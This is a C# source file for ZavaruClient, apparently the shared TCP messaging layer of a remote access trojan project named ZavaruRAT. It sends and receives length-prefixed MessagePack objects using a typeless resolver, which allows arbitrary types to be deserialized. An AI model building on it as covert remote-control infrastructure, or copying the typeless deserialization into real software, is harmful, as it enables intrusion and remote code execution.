#region

using System.Buffers;
using System.Diagnostics;
using System.Net;
using System.Net.Sockets;
using MessagePack;
using MessagePack.Resolvers;

#endregion

namespace ZavaruRAT.Shared;

[DebuggerDisplay("{ToString(),nq}")]
public sealed class ZavaruClient : IDisposable
{
    private const int SerializerMaxLength = 8 * 1024 * 1024; // 8 mb
    private readonly ArrayPool<byte> _pool = ArrayPool<byte>.Shared;

    public static readonly MessagePackSerializerOptions SerializerOptions =
        MessagePackSerializerOptions.Standard
                                    .WithAllowAssemblyVersionMismatch(true)
                                    .WithResolver(new TypelessContractlessStandardResolver());

    private readonly SemaphoreSlim _receiveSemaphore = new(1, 1);
    private NetworkStream _networkStream = null!;
    private TcpClient _tcpClient = null!;

    private ZavaruClient(string ip, int port)
    {
        IP = ip;
        Port = port;
    }

    private ZavaruClient(TcpClient tcpClient)
    {
        var remoteIP = tcpClient.Client.RemoteEndPoint as IPEndPoint;

        IP = remoteIP?.Address.ToString() ?? "<unknown>";
        Port = remoteIP?.Port ?? -1;

        _tcpClient = tcpClient;
        _networkStream = _tcpClient.GetStream();
    }

    /// <summary>
    ///     The client IP
    /// </summary>
    public string IP { get; }

    /// <summary>
    ///     The client port
    /// </summary>
    public int Port { get; }

    /// <summary>
    ///     Determine is the client is connected and can send/receive messages
    /// </summary>
    public bool Connected => _tcpClient.IsConnected();

    /// <summary>
    ///     Disposes the client
    /// </summary>
    public void Dispose()
    {
        _networkStream.Dispose();
        _tcpClient.Dispose();
    }

    /// <summary>
    ///     Creates <see cref="ZavaruClient" /> from specified IP and port, and connects to the remote
    /// </summary>
    /// <param name="ip">The IP</param>
    /// <param name="port">The port</param>
    /// <returns>The connected <see cref="ZavaruClient" /> instance</returns>
    public static async Task<ZavaruClient> CreateAsync(string ip, int port)
    {
        var client = new ZavaruClient(ip, port);
        await client.ConnectAsync();

        return client;
    }

    /// <summary>
    ///     Creates <see cref="ZavaruClient" /> from connected <see cref="TcpClient" />
    /// </summary>
    /// <param name="tcpClient">The TCP client</param>
    /// <returns>The connected <see cref="ZavaruClient" /> instance</returns>
    /// <exception cref="ArgumentException">Thrown when <paramref name="tcpClient" /> isn't connected</exception>
    public static ZavaruClient FromTcpClient(TcpClient tcpClient)
    {
        ArgumentNullException.ThrowIfNull(tcpClient);

        if (!tcpClient.IsConnected())
        {
            throw new ArgumentException("TcpClient is not connected", nameof(tcpClient));
        }

        return new ZavaruClient(tcpClient);
    }

    private async Task ConnectAsync()
    {
        _tcpClient = new TcpClient();

        await _tcpClient.ConnectAsync(IP, Port);

        _networkStream = _tcpClient.GetStream();
    }

    /// <summary>
    ///     Sends object to remote
    /// </summary>
    /// <param name="o">The object</param>
    /// <param name="cancellationToken">The cancellation token</param>
    /// <typeparam name="T">The type of object</typeparam>
    /// <exception cref="NullReferenceException">Thrown when <paramref name="o" /> is null</exception>
    /// <exception cref="OverflowException">Thrown when <paramref name="o" /> is too large to send</exception>
    public async Task SendAsync<T>(T o, CancellationToken cancellationToken = default)
    {
        ArgumentNullException.ThrowIfNull(o);

        var serialized = MessagePackSerializer.Serialize(o, SerializerOptions, cancellationToken);
        if (serialized.Length > SerializerMaxLength)
        {
            throw new
                OverflowException($"Object ({typeof(T)}) is too large ({serialized.Length} > {SerializerMaxLength})");
        }

        var serializedLength = BitConverter.GetBytes(serialized.Length);

        await _networkStream.WriteAsync(serializedLength, cancellationToken);
        await _networkStream.WriteAsync(serialized, cancellationToken);
    }

    /// <summary>
    ///     Receives object from remote
    /// </summary>
    /// <param name="timeout">The timeout. Use -1 for infinity</param>
    /// <param name="cancellationToken">The cancellation token</param>
    /// <typeparam name="T">The type of object</typeparam>
    /// <returns>The object</returns>
    /// <exception cref="OverflowException">Thrown when object size exceeds limit</exception>
    /// <exception cref="SocketException">Thrown when object size doesn't equal to the received size</exception>
    public async Task<T?> ReceiveAsync<T>(int timeout = -1, CancellationToken cancellationToken = default)
        where T : class
    {
        await _receiveSemaphore.WaitAsync(cancellationToken);

        var released = false;

        if (timeout != -1)
        {
            var cts = new CancellationTokenSource(timeout);
            cancellationToken = CancellationTokenSource.CreateLinkedTokenSource(cancellationToken, cts.Token).Token;
            cancellationToken.Register(() =>
            {
                try
                {
                    // ReSharper disable once AccessToModifiedClosure
                    if (!released)
                    {
                        _receiveSemaphore.Release();
                    }
                }
                catch
                {
                    // ignored
                }
            });
        }

        var buffer = new byte[sizeof(int)];
        var read = await _networkStream.ReadAsync(buffer.AsMemory(0, sizeof(int)), cancellationToken);

        if (read != sizeof(int))
        {
            _receiveSemaphore.Release();
            released = true;
            return null;
        }

        var length = BitConverter.ToInt32(buffer, 0);

        if (length > SerializerMaxLength)
        {
            _receiveSemaphore.Release();
            released = true;
            throw new OverflowException($"Object is too large ({length} > {SerializerMaxLength})");
        }

        buffer = _pool.Rent(length);
        await _networkStream.ReadExactlyAsync(buffer.AsMemory(0, length), cancellationToken);

        var o = MessagePackSerializer.Deserialize<T>(buffer, cancellationToken: cancellationToken);
        _pool.Return(buffer, true);

        _receiveSemaphore.Release();
        released = true;
        return o;
    }

    public override string ToString()
    {
        return $"ZavaruClient ({IP}:{Port})";
    }
}
